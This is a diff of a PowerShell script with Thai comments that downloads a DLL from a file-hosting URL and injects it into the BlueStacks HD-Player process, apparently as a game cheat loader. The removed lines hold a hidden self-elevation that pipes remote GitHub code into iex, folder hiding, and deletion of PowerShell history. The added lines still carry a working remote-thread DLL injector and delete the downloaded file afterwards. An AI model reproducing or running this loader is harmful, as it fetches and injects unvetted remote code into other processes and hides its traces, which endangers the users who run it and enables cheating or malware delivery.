@@ -1,44 +1,32 @@
 # =========================================================
-# 1. ขอสิทธิ์ Administrator (แบบ Stealth)
+# 1. เช็คสิทธิ์ Admin
 # =========================================================
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
+    Write-Warning "กรุณารัน PowerShell ในโหมด Administrator"
     exit
 }
 
 # =========================================================
-# 2. ตั้งค่าไฟล์และการพรางตัว
+# 2. ตั้งค่า Path และโหลดไฟล์
 # =========================================================
 $url = "https://files.catbox.moe/0ukxya.dll" 
-$fakeName = "mscories.dll" 
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
+$fakeName = "ms_$(Get-Random).dll" # ใช้ชื่อสุ่มเพื่อเลี่ยงการโดน Lock ไฟล์
+$dllPath = Join-Path $workDir $fakeName
 $targetProcess = "HD-Player" 
 
-# สร้างโฟลเดอร์ถ้ายังไม่มี
-if (!(Test-Path $workDir)) { 
-    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-    attrib +h +s $workDir
-}
+if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
 
-# สุ่มชื่อไฟล์หรือเช็คเพื่อไม่ให้ชนกับไฟล์ที่ถูกล็อค (ไม่ต้องรีโปรแกรม)
-$dllPath = Join-Path $workDir $fakeName
-if (Test-Path $dllPath) {
-    # ถ้าไฟล์เดิมโดนล็อค ให้สุ่มชื่อใหม่เพื่อดาวน์โหลดลงไปใหม่ได้
-    $dllPath = Join-Path $workDir "ms_$(Get-Random).dll"
-}
-
-# =========================================================
-# 3. ดาวน์โหลด DLL
-# =========================================================
 $ProgressPreference = 'SilentlyContinue'
 try {
     Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
 } catch {
-    exit # ถ้าโหลดไม่ได้ให้หยุดทำงาน
+    Write-Error "ดาวน์โหลด DLL ไม่สำเร็จ"
+    exit
 }
 
 # =========================================================
-# 4. C# Injector Code (คงเดิม)
+# 3. C# Injector (ปรับปรุงการจัดการ Memory)
 # =========================================================
 $Source = @"
 using System;
@@ -47,51 +35,68 @@ using System.Diagnostics;
 using System.Text;
 
 public class Injector {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-    [DllImport("kernel32.dll")]
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
     public static extern IntPtr GetModuleHandle(string lpModuleName);
-    [DllImport("kernel32.dll")]
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32.dll")]
+    
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll")]
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+    
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-    public static void Inject(int pid, string dllPath) {
+    public static bool Inject(int pid, string dllPath) {
+        // Open with All Access
         IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+        if (hProcess == IntPtr.Zero) return false;
+
+        // Allocate memory for DLL Path
         IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
+        if (addr == IntPtr.Zero) return false;
+
+        // Write DLL Path to memory
+        byte[] bytes = Encoding.ASCII.GetBytes(dllPath);
         IntPtr outSize;
-        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
+        if (!WriteProcessMemory(hProcess, addr, bytes, (uint)bytes.Length, out outSize)) return false;
+
+        // Get LoadLibraryA address
         IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+        
+        // Execute Remote Thread
+        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+        return hThread != IntPtr.Zero;
     }
 }
 "@
 
 # =========================================================
-# 5. เริ่มการ Inject (หาโปรเซสที่เปิดอยู่แล้ว)
+# 4. เริ่มการ Inject
 # =========================================================
-$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
 
-if ($proc -and (Test-Path $dllPath)) {
-    Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
-    # ถ้ามีหลายหน้าต่าง ให้ Inject ตัวแรกที่เจอ
-    [Injector]::Inject($proc[0].Id, $dllPath)
+$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+if ($proc) {
+    # Inject ใส่ทุก Instance ที่เจอ (กรณีเปิดหลายจอ)
+    foreach ($p in $proc) {
+        $status = [Injector]::Inject($p.Id, $dllPath)
+        if ($status) {
+            Write-Host "Successfully injected into PID: $($p.Id)" -ForegroundColor Green
+        } else {
+            Write-Host "Failed to inject into PID: $($p.Id)" -ForegroundColor Red
+        }
+    }
+} else {
+    Write-Warning "ไม่พบโปรเซส $targetProcess (กรุณาเปิด BlueStacks ทิ้งไว้)"
 }
 
-# =========================================================
-# 6. ล้างร่องรอย (Clean Up)
-# =========================================================
-Start-Sleep -Seconds 2
-
-# พยายามลบไฟล์ (ถ้าลบไม่ได้เพราะถูก Inject อยู่ ก็ปล่อยไปเพื่อไม่ให้ Error)
+# Clean Up (ลบไฟล์สุ่มทิ้งหลังจากโหลดเสร็จ)
+Start-Sleep -Seconds 3
 Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-
-Clear-History
-$historyPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $historyPath) { Remove-Item $historyPath -Force -Confirm:$false -ErrorAction SilentlyContinue }
-
-exit
